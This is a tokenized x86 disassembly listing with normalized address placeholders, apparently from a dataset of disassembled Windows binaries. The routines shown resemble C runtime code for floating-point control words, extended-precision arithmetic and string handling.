mov [ ebp - 0x20 ] eax
test esi esi
jg r-xdata
cmp dx ax
jne r-xdata
inc esi
test [ ebp - 0x18 ] 0x7fffffff
jne r-xdata
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x1c ] esi
mov [ ebp - 0x20 ] esi
jmp r-xdata
mov esi 0xbffd
cmp di si
ja r-xdata
xor eax eax
jmp r-xdata
cmp ebx [ ebp - 0x40 ]
jae r-xdata
mov ecx [ ebp - 0x40 ]
jmp r-xdata
lea eax [ esi + 0x1 ]
xor edx edx
cmp eax esi
jb r-xdata
cmp edi edx
jae r-xdata
mov [ ebp - 0x54 ] eax
lea edi [ ebp - 0xc ]
mov [ ebp - 0x40 ] 0x5
inc esi
test [ ebp - 0x28 ] 0x7fffffff
jne r-xdata
cmp [ ebp - 0x1c ] eax
jne r-xdata
cmp ebx esi
jne r-xdata
mov esi 0x3fbf
cmp di si
ja r-xdata
cmp [ ebx ] 0x39
jne r-xdata
mov eax [ ebp - 0x64 ]
cmp ebx [ ebp - 0x40 ]
jae r-xdata
cmp ebx ecx
jae r-xdata
xor edx edx
inc edx
cmp eax 0x1
jae r-xdata
mov eax [ ebp - 0x38 ]
lea edx [ eax + esi ]
mov [ ebp - 0x44 ] edx
cmp edx esi
jb r-xdata
add edi 0x2
inc [ ebp - 0x54 ]
dec [ ebp - 0x40 ]
cmp [ ebp - 0x40 ] 0x0
jg r-xdata
lea ecx [ ebp - 0x28 ]
mov [ ebp - 0x58 ] ecx
lea eax [ ebp + eax - 0x20 ]
cmp [ ebp - 0x2c ] eax
jne r-xdata
cmp [ ebp - 0x20 ] eax
jne r-xdata
xor esi esi
cmp dx si
jne r-xdata
xor esi esi
mov [ ebx ] 0x30
dec ebx
inc [ ebx ]
inc ebx
inc [ eax ]
cmp [ ebx ] 0x30
jne r-xdata
mov eax [ ebp - 0x64 ]
cmp ebx ecx
jae r-xdata
inc ecx
mov esi eax
test edx edx
je r-xdata
inc ecx
cmp edx eax
jae r-xdata
mov eax [ ebp - 0x54 ]
mov ecx [ ebp - 0x40 ]
add eax eax
mov [ ebp - 0x48 ] ecx
test ecx ecx
jle r-xdata
add esi 0xc002
test si si
jle r-xdata
mov [ ebp - 0x44 ] 0x1
cmp ebx ecx
jae r-xdata
cmp [ ebp - 0x30 ] eax
je r-xdata
mov [ ebp - 0x16 ] ax
jmp r-xdata
cmp cx si
jne r-xdata
inc edi
test [ ebp - 0x18 ] 0x7fffffff
jne r-xdata
dec ebx
sub bl al
sub bl 0x3
movsx ecx bl
mov [ eax + 0x3 ] bl
mov [ ecx + eax + 0x4 ] 0x0
mov eax [ ebp - 0x74 ]
xor edx edx
mov [ eax ] dx
mov edx 0x8000
cmp [ ebp - 0x60 ] dx
mov [ eax + 0x3 ] 0x1
setne dl
dec dl
and dl 0xd
add dl 0x20
mov [ eax + 0x2 ] dl
mov [ ecx ] 0x30
mov [ eax + 0x5 ] 0x0
jmp r-xdata
add ecx [ ebp - 0x34 ]
shr edx 0x1f
add ecx ecx
or ecx edx
lea esi [ edi + edi ]
mov [ ebp - 0x20 ] esi
mov esi [ ebp - 0x44 ]
mov [ ebp - 0x18 ] ecx
shr ecx 0x18
add esi esi
add cl 0x30
mov eax edi
shr eax 0x1f
or esi eax
mov [ ebx ] cl
inc ebx
dec [ ebp - 0x4c ]
cmp [ ebp - 0x4c ] 0x0
mov [ ebp - 0x1c ] esi
mov [ ebp - 0x15 ] 0x0
jg r-xdata
add esi 0xffff
test si si
jns r-xdata
mov edi [ ebp - 0x8 ]
test edi edi
js r-xdata
sub [ ebp - 0x58 ] 0x2
add eax 0x2
dec [ ebp - 0x48 ]
cmp [ ebp - 0x48 ] 0x0
jg r-xdata
inc [ edi ]
cmp [ ebp - 0x44 ] 0x0
mov [ edi - 0x4 ] ebx
je r-xdata
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x20 ] eax
jmp r-xdata
and [ ebp - 0x54 ] esi
lea esi [ ebp - 0xc ]
mov [ ebp - 0x40 ] 0x5
inc edi
test [ eax + 0x8 ] 0x7fffffff
jne r-xdata
cmp [ ebp - 0x1c ] esi
jne r-xdata
mov eax 0x8000
cmp [ ebp - 0x10 ] ax
ja r-xdata
mov eax esi
neg eax
movzx eax ax
add esi eax
test si si
jg r-xdata
mov eax [ ebp - 0xc ]
mov ecx [ ebp - 0x10 ]
shl [ ebp - 0x10 ] 0x1
mov edx eax
add eax eax
shr ecx 0x1f
or eax ecx
mov [ ebp - 0xc ] eax
shr edx 0x1f
lea eax [ edi + edi ]
or eax edx
add esi 0xffff
mov [ ebp - 0x8 ] eax
test si si
jg r-xdata
mov ecx [ ebp - 0x58 ]
movzx edx [ eax ]
movzx ecx [ ecx ]
and [ ebp - 0x44 ] 0x0
imul ecx edx
mov edx [ edi - 0x4 ]
lea ebx [ edx + ecx ]
cmp ebx edx
jb r-xdata
add esi 0x2
inc [ ebp - 0x54 ]
dec [ ebp - 0x40 ]
cmp [ ebp - 0x40 ] 0x0
jg r-xdata
lea ecx [ ebp + ecx - 0x20 ]
add eax 0x8
mov [ ebp - 0x70 ] ecx
mov [ ebp - 0x6c ] eax
cmp [ eax + 0x4 ] esi
jne r-xdata
cmp [ ebp - 0x20 ] esi
jne r-xdata
cmp [ ebp - 0xe ] 0xffffffff
jne r-xdata
mov ecx [ ebp - 0x10 ]
and ecx 0x1ffff
cmp ecx 0x18000
jne r-xdata
mov ecx [ ebp - 0x8 ]
mov edi [ ebp - 0xc ]
mov edx [ ebp - 0xc ]
shr [ ebp - 0x8 ] 0x1
shl ecx 0x1f
shr edi 0x1
or edi ecx
mov ecx [ ebp - 0x10 ]
shl edx 0x1f
shr ecx 0x1
or ecx edx
dec eax
mov [ ebp - 0xc ] edi
mov [ ebp - 0x10 ] ecx
jne r-xdata
inc [ ebp - 0x50 ]
mov ecx [ ebp - 0x54 ]
mov edx [ ebp - 0x40 ]
add ecx ecx
mov [ ebp - 0x50 ] edx
test edx edx
jle r-xdata
add edi 0xc002
test di di
jle r-xdata
mov [ ebp - 0x5c ] 0x1
cmp eax ecx
jae r-xdata
cmp [ eax ] esi
je r-xdata
xor eax eax
mov [ ebp - 0x16 ] ax
jmp r-xdata
inc [ ebp - 0xe ]
and [ ebp - 0xe ] 0x0
cmp [ ebp - 0xa ] 0xffffffff
jne r-xdata
mov eax 0x7fff
cmp si ax
jb r-xdata
test [ ebp - 0x10 ] 0x1
je r-xdata
cmp [ ebp - 0x50 ] eax
je r-xdata
add edi 0xffff
test di di
jns r-xdata
test [ ebp - 0x8 ] 0x80000000
jne r-xdata
add [ ebp - 0x70 ] 0x2
sub [ ebp - 0x6c ] 0x2
dec [ ebp - 0x50 ]
cmp [ ebp - 0x50 ] 0x0
jg r-xdata
inc [ esi ]
cmp [ ebp - 0x5c ] 0x0
mov [ esi - 0x4 ] eax
je r-xdata
mov [ ebp - 0x18 ] esi
mov ax [ ebp - 0xe ]
or esi [ ebp - 0x5c ]
mov [ ebp - 0x20 ] ax
mov eax [ ebp - 0xc ]
mov [ ebp - 0x1e ] eax
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x1a ] eax
mov [ ebp - 0x16 ] si
jmp r-xdata
xor eax eax
xor ecx ecx
cmp [ ebp - 0x5c ] ax
mov [ ebp - 0x1c ] eax
sete cl
mov [ ebp - 0x20 ] eax
dec ecx
and ecx 0x80000000
add ecx 0x7fff8000
mov [ ebp - 0x18 ] ecx
jmp r-xdata
inc [ ebp - 0xa ]
jmp r-xdata
and [ ebp - 0xa ] 0x0
mov ecx 0xffff
cmp [ ebp - 0x6 ] cx
jne r-xdata
or [ ebp - 0x10 ] 0x1
mov eax 0x8000
cmp [ ebp - 0x10 ] ax
ja r-xdata
mov eax edi
neg eax
movzx eax ax
add edi eax
test di di
jg r-xdata
mov eax [ ebp - 0xc ]
mov ecx [ ebp - 0x10 ]
shl [ ebp - 0x10 ] 0x1
mov edx eax
add eax eax
shr ecx 0x1f
or eax ecx
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x8 ]
shr edx 0x1f
add eax eax
or eax edx
add edi 0xffff
mov [ ebp - 0x8 ] eax
test di di
jg r-xdata
mov eax [ ebp - 0x70 ]
movzx ecx [ eax ]
mov eax [ ebp - 0x6c ]
movzx eax [ eax ]
mov edx [ esi - 0x4 ]
imul ecx eax
and [ ebp - 0x5c ] 0x0
lea eax [ edx + ecx ]
cmp eax edx
jb r-xdata
mov eax [ ebp - 0x44 ]
inc [ ebp - 0x6 ]
jmp r-xdata
mov [ ebp - 0x6 ] ax
inc esi
jmp r-xdata
cmp [ ebp - 0xe ] 0xffffffff
jne r-xdata
mov ecx [ ebp - 0x10 ]
and ecx 0x1ffff
cmp ecx 0x18000
jne r-xdata
mov ecx [ ebp - 0x8 ]
mov esi [ ebp - 0xc ]
mov edx [ ebp - 0xc ]
shr [ ebp - 0x8 ] 0x1
shl ecx 0x1f
shr esi 0x1
or esi ecx
mov ecx [ ebp - 0x10 ]
shl edx 0x1f
shr ecx 0x1
or ecx edx
dec eax
mov [ ebp - 0xc ] esi
mov [ ebp - 0x10 ] ecx
jne r-xdata
inc [ ebp - 0x48 ]
inc [ ebp - 0xe ]
and [ ebp - 0xe ] 0x0
cmp [ ebp - 0xa ] 0xffffffff
jne r-xdata
mov eax 0x7fff
cmp di ax
jb r-xdata
test [ ebp - 0x10 ] 0x1
je r-xdata
cmp [ ebp - 0x48 ] eax
je r-xdata
mov ax [ ebp - 0xe ]
or edi [ ebp - 0x58 ]
mov [ ebp - 0x20 ] ax
mov eax [ ebp - 0xc ]
mov [ ebp - 0x1e ] eax
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x1a ] eax
mov [ ebp - 0x16 ] di
jmp r-xdata
xor eax eax
xor ecx ecx
cmp [ ebp - 0x58 ] ax
mov [ ebp - 0x1c ] eax
sete cl
mov [ ebp - 0x20 ] eax
dec ecx
and ecx 0x80000000
add ecx 0x7fff8000
mov [ ebp - 0x18 ] ecx
inc [ ebp - 0xa ]
jmp r-xdata
and [ ebp - 0xa ] 0x0
mov ecx 0xffff
cmp [ ebp - 0x6 ] cx
jne r-xdata
or [ ebp - 0x10 ] 0x1
inc [ ebp - 0x6 ]
jmp r-xdata
mov [ ebp - 0x6 ] ax
inc edi
jmp r-xdata
sub_450739
xor eax eax
test bl 0x10
je r-xdata
test bl 0x8
je r-xdata
inc eax
test bl 0x4
je r-xdata
or eax 0x4
test bl 0x2
je r-xdata
or eax 0x8
test bl 0x1
je r-xdata
or eax 0x10
test ebx 0x80000
je r-xdata
or eax 0x20
mov ecx ebx
mov edx 0x300
and ecx edx
push esi
mov esi 0x200
je r-xdata
or eax 0x2
mov ecx ebx
and ecx 0x30000
je r-xdata
cmp ecx 0x100
je r-xdata
or eax edx
cmp ecx 0x10000
jne r-xdata
or eax 0x400
cmp ecx esi
je r-xdata
retn
or eax 0x1000
pop esi
test ebx 0x40000
je r-xdata
or eax esi
jmp r-xdata
or eax 0x800
jmp r-xdata
cmp ecx edx
jne r-xdata
or eax 0xc00
jmp r-xdata
sub_4507c7
xor eax eax
test dl 0x10
je r-xdata
push ebx
push esi
push edi
mov ebx 0x200
test dl 0x8
je r-xdata
mov eax 0x80
test dl 0x4
je r-xdata
or eax ebx
test dl 0x2
je r-xdata
or eax 0x400
test dl 0x1
je r-xdata
or eax 0x800
mov edi 0x100
test edx 0x80000
je r-xdata
or eax 0x1000
mov ecx edx
mov esi 0x300
and ecx esi
je r-xdata
or eax edi
mov ecx 0x3000000
pop edi
and edx ecx
pop esi
pop ebx
cmp edx 0x1000000
je r-xdata
cmp ecx edi
je r-xdata
or eax 0x8040
cmp edx 0x2000000
je r-xdata
or eax 0x2000
cmp ecx ebx
je r-xdata
or eax 0x40
retn
cmp edx ecx
jne r-xdata
or eax 0x4000
jmp r-xdata
cmp ecx esi
jne r-xdata
retn
or eax 0x8000
retn
or eax 0x6000
jmp r-xdata
sub_450867
mov edi edi
push ebp
mov ebp esp
sub esp 0x14
push ebx
push esi
push edi
fwait
fnstcw [ ebp - 0x4 ]
mov bx [ ebp - 0x4 ]
xor edx edx
test bl 0x1
je r-xdata
test bl 0x4
je r-xdata
push 0x10
pop edx
test bl 0x8
je r-xdata
or edx 0x8
test bl 0x10
je r-xdata
or edx 0x4
test bl 0x20
je r-xdata
or edx 0x2
test bl 0x2
je r-xdata
or edx 0x1
movzx ecx bx
mov eax ecx
mov esi 0xc00
and eax esi
mov edi 0x300
je r-xdata
or edx 0x80000
and ecx edi
je r-xdata
cmp eax 0x400
je r-xdata
or edx 0x20000
cmp ecx 0x200
jne r-xdata
or edx 0x100
cmp eax 0x800
je r-xdata
mov edi [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
mov eax edi
not eax
and eax edx
and ecx edi
or eax ecx
mov [ ebp + 0xc ] eax
cmp eax edx
je r-xdata
or edx 0x40000
movzx eax bx
test eax 0x1000
je r-xdata
or edx 0x10000
jmp r-xdata
or edx 0x200
jmp r-xdata
cmp eax esi
jne r-xdata
xor esi esi
cmp [ rw-data ] esi
je r-xdata
mov ebx eax
call sub_450739
movzx eax ax
mov [ ebp - 0x8 ] eax
fldcw [ ebp - 0x8 ]
fwait
fnstcw [ ebp - 0x8 ]
mov ebx [ ebp - 0x8 ]
xor edx edx
test bl 0x1
je r-xdata
or edx edi
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn
and edi 0x308031f
mov [ ebp - 0x14 ] edi
stmxcsr [ ebp - 0x10 ]
mov eax [ ebp - 0x10 ]
test al al
jns r-xdata
test bl 0x4
je r-xdata
push 0x10
pop edx
test eax 0x200
je r-xdata
push 0x10
pop esi
test bl 0x8
je r-xdata
or edx 0x8
test eax 0x400
je r-xdata
or esi 0x8
test bl 0x10
je r-xdata
or edx 0x4
test eax 0x800
je r-xdata
or esi 0x4
test bl 0x20
je r-xdata
or edx 0x2
test eax 0x1000
je r-xdata
or esi 0x2
test bl 0x2
je r-xdata
or edx 0x1
test eax 0x100
je r-xdata
or esi 0x1
movzx ecx bx
mov eax ecx
and eax esi
je r-xdata
or edx 0x80000
mov ecx eax
mov ebx 0x6000
and ecx ebx
je r-xdata
or esi 0x80000
and ecx 0x300
je r-xdata
cmp eax 0x400
je r-xdata
mov edi 0x8040
and eax edi
sub eax 0x40
je r-xdata
cmp ecx 0x2000
je r-xdata
or edx 0x20000
cmp ecx 0x200
jne r-xdata
or edx 0x100
cmp eax 0x800
je r-xdata
or esi 0x2000000
sub eax 0x7fc0
je r-xdata
or esi 0x100
cmp ecx 0x4000
je r-xdata
mov [ ebp + 0xc ] edx
mov eax edx
or edx 0x40000
test ebx 0x1000
je r-xdata
or edx 0x10000
jmp r-xdata
or edx 0x200
jmp r-xdata
cmp eax esi
jne r-xdata
call sub_4507c7
push eax
mov [ ebp - 0xc ] eax
call sub_446e3a
pop ecx
stmxcsr [ ebp - 0xc ]
mov ecx [ ebp - 0xc ]
xor edx edx
test cl cl
jns r-xdata
mov eax esi
jmp r-xdata
or esi 0x3000000
jmp r-xdata
sub eax 0x40
jne r-xdata
or esi 0x200
jmp r-xdata
cmp ecx ebx
jne r-xdata
or edx 0x300
jmp r-xdata
test ecx 0x200
je r-xdata
push 0x10
pop edx
mov ecx eax
xor ecx [ ebp + 0xc ]
or eax [ ebp + 0xc ]
test ecx 0x8031f
je r-xdata
mov eax [ ebp - 0x14 ]
mov edx eax
and eax [ ebp + 0x8 ]
not edx
and edx esi
or edx eax
cmp edx esi
jne r-xdata
or esi 0x1000000
jmp r-xdata
or esi 0x300
jmp r-xdata
test ecx 0x400
je r-xdata
or edx 0x8
or eax 0x80000000
test ecx 0x800
je r-xdata
or edx 0x4
test ecx 0x1000
je r-xdata
or edx 0x2
mov esi 0x100
test esi ecx
je r-xdata
or edx 0x1
mov eax ecx
and eax ebx
je r-xdata
or edx 0x80000
and ecx edi
sub ecx 0x40
je r-xdata
cmp eax 0x2000
je r-xdata
or edx 0x2000000
sub ecx 0x7fc0
je r-xdata
or edx esi
cmp eax 0x4000
je r-xdata
or edx 0x3000000
jmp r-xdata
sub ecx 0x40
jne r-xdata
or edx 0x200
jmp r-xdata
cmp eax ebx
jne r-xdata
mov eax edx
or edx 0x1000000
jmp r-xdata
or edx 0x300
jmp r-xdata
sub_450b79
mov edi edi
push ebp
mov ebp esp
push ebx
xor ebx ebx
cmp [ ebp + 0x8 ] ebx
jne r-xdata
push esi
push edi
push [ ebp + 0x8 ]
call sub_43c860
lea esi [ eax + 0x1 ]
push esi
call sub_438337
mov edi eax
pop ecx
pop ecx
cmp edi ebx
je r-xdata
xor eax eax
jmp r-xdata
xor eax eax
push [ ebp + 0x8 ]
push esi
push edi
call sub_43f118
add esp 0xc
test eax eax
jne r-xdata
pop ebx
pop ebp
retn
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_43f873
mov eax edi
jmp r-xdata
pop edi
pop esi
sub_450bcb
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
push [ ebp + 0x10 ]
lea ecx [ ebp - 0x10 ]
call sub_438ce6
mov eax [ ebp + 0x8 ]
xor ebx ebx
cmp eax ebx
jne r-xdata
push esi
mov esi [ ebp - 0xc ]
cmp [ esi + 0x8 ] ebx
jne r-xdata
call sub_43c04c
mov [ eax ] 0x16
call sub_43f8c5
cmp [ ebp - 0x4 ] bl
je r-xdata
movzx ecx [ eax ]
cmp cx bx
jne r-xdata
push [ ebp + 0xc ]
push eax
call sub_43c270
pop ecx
pop ecx
jmp r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
movzx edx cl
test [ edx + esi + 0x1d ] 0x4
je r-xdata
movzx ecx cx
cmp [ ebp + 0xc ] ecx
jne r-xdata
cmp [ ebp - 0x4 ] bl
je r-xdata
pop ebx
leave
retn
movzx edx cx
cmp [ ebp + 0xc ] edx
je r-xdata
inc eax
mov dl [ eax ]
cmp dl bl
je r-xdata
cmp [ ebp - 0x4 ] bl
je r-xdata
pop esi
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
jmp r-xdata
inc eax
movzx ecx cx
movzx edx dl
shl ecx 0x8
or ecx edx
cmp [ ebp + 0xc ] ecx
jne r-xdata
xor eax eax
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
dec eax
jmp r-xdata
sub_450cc8
mov edi edi
push ebp
mov ebp esp
sub esp 0x18
mov eax [ ebp + 0x10 ]
push ebx
xor ebx ebx
push esi
push edi
mov [ ebp - 0x4 ] 0x404e
mov [ eax ] ebx
mov [ eax + 0x4 ] ebx
mov [ eax + 0x8 ] ebx
cmp [ ebp + 0xc ] ebx
jbe r-xdata
cmp [ eax + 0x8 ] ebx
jne r-xdata
xor ecx ecx
mov [ ebp + 0x10 ] ebx
mov edi [ eax + 0x8 ]
test edi 0x8000
jne r-xdata
mov edx [ eax + 0x4 ]
mov [ ebp + 0x10 ] 0x1
cmp edx [ ebp - 0x18 ]
jae r-xdata
mov cx [ ebp - 0x4 ]
pop edi
pop esi
mov [ eax + 0xa ] cx
pop ebx
leave
retn
mov ecx [ eax + 0x4 ]
mov ecx [ eax ]
add [ ebp - 0x4 ] 0xfff0
mov edi edx
mov esi ecx
shr esi 0x10
shl edx 0x10
shr edi 0x10
or edx esi
shl ecx 0x10
mov [ eax + 0x4 ] edx
mov [ eax ] ecx
cmp edi ebx
je r-xdata
mov [ eax + 0x8 ] edi
mov esi [ ebp - 0x14 ]
and [ ebp + 0x10 ] 0x0
lea ebx [ edi + esi ]
cmp ebx edi
jb r-xdata
mov esi [ ebp - 0x8 ]
and [ ebp + 0x10 ] 0x0
lea edi [ esi + 0x1 ]
cmp edi esi
jb r-xdata
cmp [ ebp + 0x10 ] 0x0
mov [ eax ] edx
je r-xdata
mov ebx [ eax ]
add [ ebp - 0x4 ] 0xffff
mov esi ecx
mov edx ebx
shr esi 0x1f
add edi edi
shr edx 0x1f
add ecx ecx
or edi esi
add ebx ebx
or ecx edx
mov [ eax ] ebx
mov [ eax + 0x4 ] ecx
mov [ eax + 0x8 ] edi
test edi 0x8000
je r-xdata
mov [ ebp + 0x10 ] 0x1
cmp ebx esi
jae r-xdata
mov [ ebp + 0x10 ] 0x1
cmp edi 0x1
jae r-xdata
add ecx [ ebp - 0x10 ]
and [ ebp - 0x8 ] 0x0
mov edi ebx
add ecx ecx
mov esi edx
shr edi 0x1f
or ecx edi
shr esi 0x1f
add ebx ebx
add edx edx
or ebx esi
mov [ eax + 0x8 ] ecx
mov [ ebp - 0xc ] ecx
mov [ ebp + 0x10 ] ecx
mov ecx [ ebp + 0x8 ]
mov [ eax ] edx
mov [ eax + 0x4 ] ebx
movsx esi [ ecx ]
lea ecx [ edx + esi ]
mov [ ebp - 0x18 ] esi
cmp ecx edx
jb r-xdata
inc ecx
mov [ eax + 0x8 ] ecx
cmp [ ebp + 0x10 ] 0x0
mov [ eax + 0x4 ] ebx
je r-xdata
inc ecx
mov [ eax + 0x8 ] ecx
cmp [ ebp + 0x10 ] 0x0
mov [ eax + 0x4 ] edi
je r-xdata
mov [ ebp - 0x8 ] 0x1
cmp ecx esi
jae r-xdata
dec [ ebp + 0xc ]
mov edx [ ebp + 0x10 ]
inc [ ebp + 0x8 ]
cmp [ ebp + 0xc ] 0x0
mov [ eax + 0x4 ] ebx
mov [ eax + 0x8 ] edx
ja r-xdata
lea edx [ ebx + 0x1 ]
xor esi esi
cmp edx ebx
jb r-xdata
cmp [ ebp - 0x8 ] 0x0
mov [ eax ] ecx
je r-xdata
mov esi eax
lea edi [ ebp - 0x18 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov edx ecx
lea edi [ ecx + ecx ]
shr edx 0x1f
lea ecx [ ebx + ebx ]
or ecx edx
mov edx [ ebp + 0x10 ]
and [ ebp + 0x10 ] 0x0
mov esi ebx
mov ebx ecx
mov [ ebp - 0x8 ] edi
shr esi 0x1f
add edx edx
or edx esi
mov esi [ ebp - 0x8 ]
add ecx ecx
shr edi 0x1f
or ecx edi
mov edi ecx
mov [ ebp - 0x8 ] ecx
lea ecx [ edx + edx ]
mov edx [ ebp - 0x18 ]
add esi esi
shr ebx 0x1f
or ecx ebx
add edx esi
mov [ eax ] esi
mov [ eax + 0x4 ] edi
mov [ eax + 0x8 ] ecx
cmp edx esi
jb r-xdata
xor ebx ebx
xor esi esi
inc esi
cmp edx 0x1
jae r-xdata
mov edx [ ebp - 0xc ]
inc edx
mov [ ebp + 0x10 ] edx
mov [ eax + 0x8 ] edx
mov ebx edx
mov [ eax + 0x4 ] edx
test esi esi
je r-xdata
sub_454740
cmp [ rw-data ] 0x0
je r-xdata
mov [ rw-data ] 0x0
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
mov [ rw-data ] 0x1
jne r-xdata
retn
sub_401000
mov [ ecx ] r--data
jmp sub_437d2d
sub_401040
retn
sub_4019f0
cmp [ eax + 0x14 ] 0x8
jb r-xdata
retn
mov eax [ eax ]
sub_401ffd
mov edx [ ebp - 0x14 ]
push edx
call sub_43811c
add esp 0x4
push 0x0
push 0x0
call sub_43c3a5
int3
sub_40214f
mov edx [ ebp - 0x14 ]
push edx
call sub_43811c
add esp 0x4
push 0x0
push 0x0
call sub_43c3a5
int3
sub_4023c0
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
push eax
mov esi ecx
call sub_437d5f
mov [ esi ] r--data
mov eax esi
pop esi
pop ebp
retn 0x4
sub_402760
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
push eax
mov esi ecx
call sub_437d5f
mov [ esi ] r--data
mov eax esi
pop esi
pop ebp
retn 0x4
sub_402830
mov [ ecx ] r--data
retn
sub_402ae0
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
add ecx 0x8
push ecx
push eax
call sub_43620f
add esp 0x8
pop ebp
retn 0x4
sub_402b40
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
add ecx 0x8
push ecx
push eax
call sub_436275
add esp 0x8
pop ebp
retn 0x4
j_sub_437d2d#2
jmp sub_437d2d
sub_403650
push esi
mov esi ecx
mov eax [ esi ]
test eax eax
je r-xdata
mov [ esi ] 0x0
pop esi
retn
push eax
call sub_4381f8
add esp 0x4
sub_4036d0
mov eax [ ecx - 0x10 ]
mov edx [ eax + 0x4 ]
mov [ edx + ecx - 0x10 ] r--data
retn
sub_403760
add ecx 0x4
jmp sub_4361f8
sub_403770
add ecx 0x4
jmp sub_436201
sub_403780
mov eax 0xffff
retn 0x4
sub_403790
mov eax 0xffff
retn
sub_4039c0
retn 0x4
sub_403b70
mov eax [ ecx - 0x18 ]
mov edx [ eax + 0x4 ]
mov [ edx + ecx - 0x18 ] r--data
mov eax [ ecx - 0x8 ]
mov edx [ eax + 0x4 ]
mov [ edx + ecx - 0x8 ] r--data
mov eax [ ecx - 0x18 ]
mov edx [ eax + 0x4 ]
mov [ edx + ecx - 0x18 ] r--data
retn
sub_404370
lea eax [ ecx + 0x8 ]
mov ecx [ eax - 0x8 ]
mov edx [ ecx + 0x4 ]
mov [ edx + eax - 0x8 ] r--data
push eax
mov [ eax ] r--data
call sub_435d94
pop ecx
retn
sub_404390
lea eax [ ecx + 0x10 ]
mov ecx [ eax - 0x10 ]
mov edx [ ecx + 0x4 ]
mov [ edx + eax - 0x10 ] r--data
push eax
mov [ eax ] r--data
call sub_435d94
pop ecx
retn
sub_4043b0
mov eax [ ecx + 0x20 ]
cmp [ eax ] 0x0
je r-xdata
xor eax eax
cdq
retn
mov ecx [ ecx + 0x30 ]
mov eax [ ecx ]
cdq
retn
sub_4043d0
mov eax [ ecx + 0x24 ]
cmp [ eax ] 0x0
je r-xdata
xor eax eax
cdq
retn
mov ecx [ ecx + 0x34 ]
mov eax [ ecx ]
cdq
retn
sub_4046e1
mov eax r-xdata
retn
sub_405b70
cmp [ eax + 0x14 ] 0x10
jb r-xdata
retn
mov eax [ eax ]
sub_40615f
mov edx [ ebp - 0x14 ]
push edx
call sub_43811c
add esp 0x4
push 0x0
push 0x0
call sub_43c3a5
int3
sub_4067b0
mov eax [ eax ]
mov ecx [ eax ]
mov edx [ ecx + 0x4 ]
mov eax [ edx + eax + 0x38 ]
test eax eax
je r-xdata
retn
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0x8 ]
jmp eax
sub_409820
push ebp
mov ebp esp
push ecx
mov eax [ ecx ]
mov edx [ eax + 0x10 ]
push esi
mov [ ebp - 0x4 ] 0x0
call edx
mov eax esi
mov esp ebp
pop ebp
retn
sub_409840
mov ax [ ecx + 0xc ]
retn
sub_409850
mov ax [ ecx + 0xe ]
retn
sub_40a912
mov esi [ ebp + 0x8 ]
call sub_427c80
xor ebx ebx
push ebx
push ebx
call sub_43c3a5
int3
sub_40c4f1
mov ecx [ ebp - 0x14 ]
push ecx
call sub_43811c
add esp 0x4
push 0x0
push 0x0
call sub_43c3a5
int3
sub_40c5f0
mov ecx [ ebp - 0x14 ]
push ecx
call sub_43811c
add esp 0x4
push 0x0
push 0x0
call sub_43c3a5
int3
sub_40c6f2
mov eax [ ebp - 0x14 ]
push eax
call sub_43811c
add esp 0x4
push 0x0
push 0x0
call sub_43c3a5
int3
sub_40c7f0
mov eax [ ebp - 0x14 ]
push eax
call sub_43811c
add esp 0x4
push 0x0
push 0x0
call sub_43c3a5
int3
sub_40cdf0
push 0xffffffff
push 0x0
mov [ esi + 0x14 ] 0xf
mov [ esi + 0x10 ] 0x0
push eax
mov ecx esi
mov [ esi ] 0x0
call sub_405cb0
mov eax esi
retn
sub_40cf00
cmp [ esi + 0x38 ] 0x8
jb r-xdata
xor ecx ecx
mov [ esi + 0x38 ] 0x7
mov [ esi + 0x34 ] 0x0
mov [ esi + 0x24 ] cx
retn
mov eax [ esi + 0x24 ]
push eax
call sub_43811c
add esp 0x4
sub_40d090
cmp [ esi + 0x20 ] 0x10
jb r-xdata
xor eax eax
mov [ esi + 0x20 ] 0xf
mov [ esi + 0x1c ] eax
mov [ esi + 0xc ] al
retn
mov eax [ esi + 0xc ]
push eax
call sub_43811c
add esp 0x4
sub_40d298
mov esi [ ebp + 0x8 ]
call sub_40c130
push 0x0
push 0x0
call sub_43c3a5
int3
sub_40ddc5
mov ecx [ ebp - 0x14 ]
push ecx
call sub_43811c
add esp 0x4
push 0x0
push 0x0
call sub_43c3a5
int3
sub_40e8b8
mov ecx [ ebp - 0x14 ]
push ecx
call sub_43811c
add esp 0x4
push 0x0
push 0x0
call sub_43c3a5
int3
sub_40ed10
push ebp
mov ebp esp
movzx eax [ ebp + 0x8 ]
add ecx 0x8
push ecx
push eax
call sub_436580
add esp 0x8
pop ebp
retn 0x4
sub_40ed60
push ebp
mov ebp esp
movzx eax [ ebp + 0x8 ]
add ecx 0x8
push ecx
push eax
call sub_4374cf
add esp 0x8
pop ebp
retn 0x4
sub_40edb0
push ebp
mov ebp esp
mov al [ ebp + 0x8 ]
pop ebp
retn 0x4
sub_40edf0
push ebp
mov ebp esp
mov al [ ebp + 0x8 ]
pop ebp
retn 0x8
sub_40eed0
push ecx
mov [ ecx ] r--data
call sub_435d94
pop ecx
retn
sub_40f130
or eax 0xffffffff
retn 0x4
sub_40f140
xor eax eax
xor edx edx
retn
sub_40f150
or eax 0xffffffff
retn
sub_40f3b0
mov eax ecx
